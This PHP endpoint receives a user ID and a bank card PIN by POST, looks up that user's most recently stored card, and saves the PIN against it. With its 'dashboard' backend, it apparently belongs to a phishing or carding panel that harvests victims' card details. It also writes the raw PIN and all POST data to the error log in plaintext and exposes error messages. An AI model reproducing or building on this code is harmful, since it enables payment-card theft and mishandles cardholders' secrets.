<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();
require_once('../dashboard/init.php');

// ✅ Log كل شي
error_log("=== PIN.PHP START ===");
error_log("POST data: " . print_r($_POST, true));

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    error_log("❌ Wrong method: " . $_SERVER['REQUEST_METHOD']);
    http_response_code(405);
    exit('METHOD_NOT_ALLOWED');
}

$userId = $_POST['user_id'] ?? null;
$pinCode = $_POST['pin'] ?? '';

error_log("User ID: $userId");
error_log("PIN Code: $pinCode");

if (!$userId || empty($pinCode)) {
    error_log("❌ Missing data - userId: $userId, pin: $pinCode");
    http_response_code(400);
    exit('MISSING_DATA');
}

// ✅ تحقق من وجود $User object
if (!isset($User)) {
    error_log("❌ \$User object not found!");
    http_response_code(500);
    exit('USER_OBJECT_MISSING');
}

// ✅ جلب آخر بطاقة
try {
    $lastCard = $User->fetchLastCardByUserId($userId);
    error_log("Last card result: " . print_r($lastCard, true));
} catch (Exception $e) {
    error_log("❌ fetchLastCardByUserId error: " . $e->getMessage());
    http_response_code(500);
    exit('FETCH_CARD_ERROR: ' . $e->getMessage());
}

$cardId = $lastCard ? $lastCard->id : null;
error_log("Card ID to use: $cardId");

// ✅ حفظ PIN
try {
    error_log("Calling insertCardPIN($cardId, $userId, $pinCode)");
    $saved = $User->insertCardPIN($cardId, $userId, $pinCode);
    error_log("insertCardPIN result: " . ($saved ? 'TRUE' : 'FALSE'));
    
    if ($saved) {
        error_log("✅ PIN saved successfully");
        http_response_code(200);
        exit('SUCCESS');
    } else {
        error_log("❌ insertCardPIN returned false");
        http_response_code(500);
        exit('SAVE_FAILED');
    }
} catch (Exception $e) {
    error_log("❌ insertCardPIN exception: " . $e->getMessage());
    error_log("Stack trace: " . $e->getTraceAsString());
    http_response_code(500);
    exit('INSERT_ERROR: ' . $e->getMessage());
}